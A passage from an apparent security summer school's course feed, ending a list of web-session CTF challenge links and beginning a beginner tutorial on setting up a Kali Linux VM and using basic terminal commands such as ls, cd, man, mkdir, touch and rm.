Is there any useful information from a security point of view ?
Write the answer to the instructor.&lt;/p>
&lt;p>&lt;img src="./assets/first-activity.png" alt="FirstActivity">&lt;/p>
&lt;p>&lt;strong>2.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Cockroach&lt;/a>&lt;br>
&lt;strong>3.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Gimme&lt;/a>&lt;br>
&lt;strong>4.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Surprise&lt;/a>&lt;br>
&lt;strong>5.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">My Special Name&lt;/a>&lt;br>
&lt;strong>6.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Lame Login&lt;/a>&lt;br>
&lt;strong>7.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Eyes&lt;/a>&lt;br>
&lt;strong>8.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Name&lt;/a>&lt;br>
&lt;strong>9.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Readme&lt;/a>&lt;br>
&lt;strong>10.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">King-Kong&lt;/a>&lt;br>
&lt;strong>11.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Give to Get&lt;/a>&lt;br>
&lt;strong>12.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Give to Post&lt;/a>&lt;br>
&lt;strong>13.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">One by One&lt;/a>&lt;br>
&lt;strong>14.&lt;/strong> &lt;a href="https://sss-ctf.security.cs.pub.ro/challenges?category=web-sessions">Produce-consume&lt;/a>&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/welcome-to-linux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/welcome-to-linux/</guid><description>
&lt;h1 id="welcome-to-linux">Welcome to Linux&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>In this session, we will familiarise ourselves with our working environment.
We will learn how to set up a Kali Linux virtual machine and how to use its capabilities.
We will also introduce the programming language that we&amp;rsquo;ll use throughout all sessions: Python.&lt;/p>
&lt;h2 id="prerequisites">Prerequisites&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Fluency in the English language&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Basic programming knowledge (you are able to develop and run basic programs using integers, strings, arrays)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The ability to use and search the internet&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Curiosity, thirst for knowledge&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Interest in cybersecurity&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="what-is-linux">What is Linux?&lt;/h2>
&lt;p>Well, &lt;a href="https://en.wikipedia.org/wiki/Linux">Linux&lt;/a> is family of operating systems (OS&amp;rsquo;s).
One such OS is &lt;a href="https://en.wikipedia.org/wiki/Kali_Linux">Kali Linux&lt;/a>, which is specially designed for security enthusiasts.
This means that Kali comes with a few hundred preinstalled apps that are useful for anywone working in or learning about security.
We&amp;rsquo;ll be using some of these apps throughout this track.&lt;/p>
&lt;h2 id="setting-up-your-kali-virtual-machine">Setting up Your Kali Virtual Machine&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Start downloading the &lt;a href="https://security.cs.pub.ro/summer-school/wiki/_media/session/infrastructure/sss-kali-amd64.ova.torrent">Kali VM Image&lt;/a> torrent.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Download the VirtualBox installer for your system from &lt;a href="https://www.virtualbox.org/wiki/Downloads">here&lt;/a>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Install VirtualBox using the installer you downloaded at step 2.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Start VirtualBox.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>When the download started at step 1 finishes, press the &lt;strong>Import&lt;/strong> button.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Select the downloaded &lt;code>.ova&lt;/code> file (the VM image) in the newly opened window.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Click &lt;strong>Import&lt;/strong>.
You&amp;rsquo;ll be able to change the VM&amp;rsquo;s resources later.
After the import finishes, the VM should appear to the left of the VirtualBox window&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Click the VM and then click &lt;strong>Start&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use the username &lt;code>root&lt;/code> and the password &lt;code>toor&lt;/code> to log in.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="working-with-linux">Working with Linux&lt;/h2>
&lt;h3 id="i-command-thee">I Command Thee&lt;/h3>
&lt;p>The most important shortcut when using a Linux operating system is &lt;code>Ctrl + Alt + t&lt;/code>.
Try it now!
The dark box that has appeared is called a &lt;strong>terminal&lt;/strong>.
A terminal is a means by which we can tell the operating system what to do for us.
In other words, we use the terminal in order to give &lt;strong>commands&lt;/strong> to the operating system using a text interface, without the use of a mouse or fancy graphics.
Hence the terminal&amp;rsquo;s alternative name: the &lt;strong>Command-Line Interface (CLI)&lt;/strong>.
What you&amp;rsquo;ve been using until now, namely navigating the desktop environment by clicking on shortcuts, files and links is called the &lt;strong>Graphical User Interface (GUI)&lt;/strong>.&lt;/p>
&lt;p>Here are a few useful key shortcuts for navigating the terminal more easily:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>open another terminal window: &lt;code>Shift + Alt + t&lt;/code>;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>navigate between open terminal windows: &lt;code>Alt + N&lt;/code>, where &lt;code>N&lt;/code> is the index of the tab you want to switch to &lt;strong>(starting from 1)&lt;/strong>;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>close the current window: &lt;code>Ctrl + d&lt;/code>;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>copy text from the terminal: &lt;code>Ctrl + Shift + c&lt;/code>;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>paste text to the terminal: &lt;code>Ctrl + Shift + v&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>It&amp;rsquo;s kind of like a web browser, if you think about it, but with different key combinations.
Don&amp;rsquo;t worry about memorising them now, though.
You&amp;rsquo;ll get plenty of time to practice them in today&amp;rsquo;s activities and in the sessions to come.
For more terminal shortcuts, see the section &lt;a href="#more-terminal-tricks">More Terminal Tricks&lt;/a> below.&lt;/p>
&lt;h4 id="the-prompt">The Prompt&lt;/h4>
&lt;p>Note that the line begins with &lt;code>root@kali:~#&lt;/code>.
This is what is called a &lt;strong>prompt&lt;/strong>.
It&amp;rsquo;s like a sign that the current terminal is waiting for commands to execute.&lt;/p>
&lt;p>The format of the prompt is the following:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">user@host_name: current_working_directory #
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s look at each of these components one by one.&lt;/p>
&lt;ul>
&lt;li>&lt;code>user&lt;/code> is the name of the current user.
In our case, it says &lt;code>root&lt;/code>.
We&amp;rsquo;ll see what this means in its dedicated &lt;a href="#the-root-user">section&lt;/a> below.
We chan check that the user truly is &lt;code>root&lt;/code> using the command &lt;code>whoami&lt;/code>:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# whoami
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>host_name&lt;/code> is the name of the current system.
Once again, we can check if &lt;code>kali&lt;/code> truly is our hostname by running the command &lt;code>hostname&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# hostname
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">kali
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>&lt;code>#&lt;/code> is a sign that tells us that the prompt is over and that you can start typing commands.
It can also be &lt;code>$&lt;/code> or &lt;code>&amp;gt;&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>current_working_directory&lt;/code> is the &lt;strong>path&lt;/strong> in the file system where we are currently located.
If this sounds confusing, don&amp;rsquo;t worry.
We&amp;rsquo;ll explain the file hierarchy right now.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h4 id="the-file-system">The File System&lt;/h4>
&lt;p>One of the most important things when we&amp;rsquo;re using the CLI and after hacking a remote system is to know where we are in its file hierarchy.
This hierarchy is more commonly known as the &lt;strong>file system&lt;/strong>.
The path separator in Linux is &lt;code>/&lt;/code>, unlike Windows, where it&amp;rsquo;s &lt;code>\&lt;/code>.
At the same time, &lt;code>/&lt;/code> is the root of the file system.&lt;/p>
&lt;p>The file hierarchy looks like this:&lt;/p>
&lt;p>&lt;img src="./assets/sample_file_hierarchy.svg" alt="Sample File Hierarchy">&lt;/p>
&lt;p>Going back to the &lt;code>current_working_directory&lt;/code> in the prompt, the terminal can also be seen as a file walker.
This means that at each moment it is &amp;ldquo;placed&amp;rdquo; in a certain directory, i.e. at some point in the file hierarchy.
We can see that the prompt shows &lt;code>~&lt;/code>.
This stands for &lt;strong>the home directory of the current user&lt;/strong>.
Our current user is &lt;code>root&lt;/code> and its home directory is &lt;code>/root&lt;/code>.
Let&amp;rsquo;s check this by running the command &lt;code>pwd&lt;/code> (print working directory):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# pwd
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">/root
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="traversing-the-file-system">Traversing the File System&lt;/h4>
&lt;p>Great!
So now we know &lt;strong>where&lt;/strong> we are in the file system.
Let&amp;rsquo;s see what&amp;rsquo;s here in &lt;code>/root&lt;/code>.
For this, we use &lt;code>ls&lt;/code>, that simply lists the contents of the current directory:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Desktop ghidra_9.1.2_PUBLIC peda %SystemDrive%
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Documents libc-database Pictures Templates
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Downloads Music Public Videos
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>That&amp;rsquo;s quite a bit of stuff, but there&amp;rsquo;s no need to look into each of these now.
Let&amp;rsquo;s focus on navigating the file system for now.&lt;/p>
&lt;p>Almost every linux command, such as &lt;code>ls&lt;/code>, can take various parameters that alter its behaviour.
&lt;code>ls&lt;/code> for instance can list any given directory, not just the current directory.
This reqiures the use of the path to list as a parameter:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls / # list the contents of the / (root) directory
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">0 dev initrd.img lib32 lost+found proc sbin tmp vmlinuz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">bin etc initrd.img.old lib64 media root srv usr vmlinuz.old
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">boot home lib libx32 opt run sys var
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls /media # list the contents of the /media directory
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">cdrom cdrom0
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice the second &lt;code>#&lt;/code> symbol in each command.
This one is different from the one in the prompt.
It marks the beginning of a comment, just like &lt;code>//&lt;/code> does in C.&lt;/p>
&lt;p>So we can now see what a given directory contains, but we&amp;rsquo;re still stuck in &lt;code>/root&lt;/code>.
Let&amp;rsquo;s change our current directory. For this, we use &lt;code>cd&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls libc-database/ # list the contents of libc-database
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">add common db dump find get identify README.md tmp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~# cd libc-database/ # move to libc-database
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/libc-database# ls # list the contetns of the current directory (now libc-database)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">add common db dump find get identify README.md tmp
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/libc-database# pwd # check that we really are in libc-database
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">/root/libc-database
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice the prompt change to &lt;code>~/libc-database&lt;/code> after &lt;code>cd&lt;/code> because the current directory changes.&lt;/p>
&lt;p>Stop!
&lt;strong>&lt;code>Tab&lt;/code> Time!&lt;/strong>
Almost every CLI is capable of autocompletion and that of Linux is no different.
Type &lt;code>cd l&lt;/code> and then press &lt;code>Tab&lt;/code>.
Notice that the rest of the directory&amp;rsquo;s name has been autofilled: &lt;code>cd libc-database/&lt;/code>.
Now type &lt;code>cd D&lt;/code> and press &lt;code>Tab&lt;/code> &lt;strong>twice&lt;/strong>.
Notice that 3 options have appeared.
What happened is that the terminal found 3 directories that start with &lt;code>D&lt;/code> and is asking you for more information.
Type &lt;code>e&lt;/code> and press &lt;code>Tab&lt;/code> once more.
Now the terminal sees there is only one option, &lt;code>Desktop/&lt;/code> and autofills it for you.&lt;/p>
&lt;p>&lt;code>Tab&lt;/code> allows you to use the terminal very efficiently.
It&amp;rsquo;s one of the most powerful tools at our disposal, so remember to abuse it as much as possible.
&lt;strong>Keep in mind: there is no such thing as pressing &lt;code>Tab&lt;/code> too many times&lt;/strong>.&lt;/p>
&lt;p>Now back to our directories.
So we&amp;rsquo;re in &lt;code>libc-database&lt;/code>, but how do we get back to &lt;code>/root&lt;/code>?
Similarly to a browser, the parent of any directory can be accessed using &lt;code>..&lt;/code> like so:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/libc-database# ls ..
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Desktop ghidra_9.1.2_PUBLIC peda %SystemDrive%
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Documents libc-database Pictures Templates
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Downloads Music Public Videos
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/libc-database# cd ..
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Desktop ghidra_9.1.2_PUBLIC peda %SystemDrive%
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Documents libc-database Pictures Templates
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Downloads Music Public Videos
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~# pwd
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">/root
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Makes sense?
Alright.
So now we can move anywhere.
We can chain paths using the separator (&lt;code>/&lt;/code>), even adding &lt;code>..&lt;/code>, like so:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/libc-database# cd ../.. # we are in /root/libc-database
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:/# ls # now we are 2 levels up, in /
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">0 dev initrd.img lib32 lost+found proc sbin tmp vmlinuz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">bin etc initrd.img.old lib64 media root srv usr vmlinuz.old
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">boot home lib libx32 opt run sys var
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="be-a-man">Be a Man&lt;/h4>
&lt;p>Almost every Linux command comes with extensive documentation.
This documentation can be read using &lt;code>man &amp;lt;command&amp;gt;&lt;/code>.
Let&amp;rsquo;s try reading the manual page for the &lt;code>ls&lt;/code> command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# man ls
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>Use &lt;code>↑&lt;/code> and &lt;code>↓&lt;/code> to scroll up and down.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Space&lt;/code> to scroll one whole page down.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>/&amp;lt;string&amp;gt;&lt;/code> to search for any string.
Try searching for the string &amp;ldquo;recursive&amp;rdquo;.
Use &lt;code>n&lt;/code> to navigate to the next occurrence of your string and &lt;code>Shfit + n&lt;/code> to navigate to the previous one.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>q&lt;/code> to quit the manual&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>Task 1:&lt;/strong> Use the parameter you&amp;rsquo;ve just found to recursively list the contents of the &lt;code>/root/libc-database&lt;/code> directory, using both relative and absolute paths.&lt;/p>
&lt;p>&lt;strong>Task 2:&lt;/strong> Use the man page for &lt;code>ls&lt;/code> again to learn how to view the contents of a directory in the form of a &lt;strong>long listing&lt;/strong>.
This parameter will show you more details regarding a file, such as its type, size, owner, access rights, the date when it was last modified etc.
Test it on the file &lt;code>/root/libc-database/README.md&lt;/code>&lt;/p>
&lt;p>&lt;strong>Task 3:&lt;/strong> Use the man page for &lt;code>ls&lt;/code> to find out what parameter to pass to &lt;code>ls&lt;/code> to list &lt;strong>all&lt;/strong> entries in a directory.
This option will also show you the &lt;strong>hidden&lt;/strong> files in that directory.
These files start with &lt;code>.&lt;/code>.
Test it on the &lt;code>~&lt;/code> directory.
Notice our friend &lt;code>..&lt;/code> is also present.&lt;/p>
&lt;h4 id="ill-make-my-own-hierarchy">I&amp;rsquo;ll Make My Own Hierarchy&lt;/h4>
&lt;p>In order to create directories we use the &lt;code>mkdir&lt;/code> command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# mkdir demo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">demo Documents ghidra_9.1.2_PUBLIC Music Pictures %SystemDrive% Videos
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">Desktop Downloads libc-database peda Public Templates
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~# cd demo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo#
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s create a file in our new directory.
For this, we use the &lt;code>touch&lt;/code> command.
It creates an &lt;strong>empty&lt;/strong> file.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# touch demo-file
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">demo-file
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# cat demo-file # The file is empty, so nothing is printed.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# touch demo-file2 # Just because we can.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">demo-file demo-file2
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In order to remove a file, we use the &lt;code>rm&lt;/code> command.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# rm demo-file2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">&lt;/span>&lt;span style="color:#000;font-style:italic">root@kali:~/demo# ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">demo-file
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s try to remove our directory the same way.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">root@kali:~# rm demo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">rm: cannot remove &amp;#39;demo&amp;#39;: Is a directory
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Deleting a directory requires that an extra parameter be passed to &lt;code>rm&lt;/code>.
Find it in &lt;code>rm&lt;/code>&amp;rsquo;s &lt;code>man&lt;/code> page.
Look for the string &amp;ldquo;recursively&amp;rdquo;.
Yup, it&amp;rsquo;s &lt;code>-r&lt;/code> (or &lt;code>-R&lt;/code>, or &lt;code>--recursive&lt;/code>; all three work).&lt;/p>
